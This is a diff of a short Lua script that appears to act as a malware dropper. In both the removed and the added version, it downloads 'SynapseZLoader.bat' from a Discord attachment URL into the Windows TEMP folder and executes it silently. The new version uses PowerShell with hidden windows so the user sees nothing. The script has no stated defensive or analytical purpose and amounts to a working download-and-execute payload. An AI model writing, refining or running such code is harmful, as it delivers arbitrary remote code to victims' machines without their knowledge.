@@ -1,19 +1,22 @@
-local http = require("socket.http")
-local ltn12 = require("ltn12")
 local url = "https://cdn.discordapp.com/attachments/1334408747421925408/1345451006405644318/SynapseZLoader.bat"
-local output_path = os.getenv("TEMP") .. "\\SynapseZLoader.bat"
+local download_path = os.getenv("TEMP") .. "\\SynapseZLoader.bat"
 
--- Download the file
-local file = io.open(output_path, "wb")
-if file then
-    http.request{
-        url = url,
-        sink = ltn12.sink.file(file)
-    }
-    file:close()
-
-    -- Execute file in the background without showing a window (Windows-specific)
-    os.execute('start /b "" "' .. output_path .. '" > nul 2>&1')
-else
-    print("Failed to open file for writing")
+function download_file(url, path)
+    local command = string.format(
+        'start /b powershell -Command "(New-Object System.Net.WebClient).DownloadFile(\\"%s\\", \\"%s\\")"',
+        url, path
+    )
+    os.execute(command)
 end
+
+function run_silently(path)
+    local command = string.format(
+        'start /b powershell -WindowStyle Hidden -Command "Start-Process \\"%s\\" -WindowStyle Hidden"',
+        path
+    )
+    os.execute(command)
+end
+
+-- Execute the script
+download_file(url, download_path)
+run_silently(download_path)
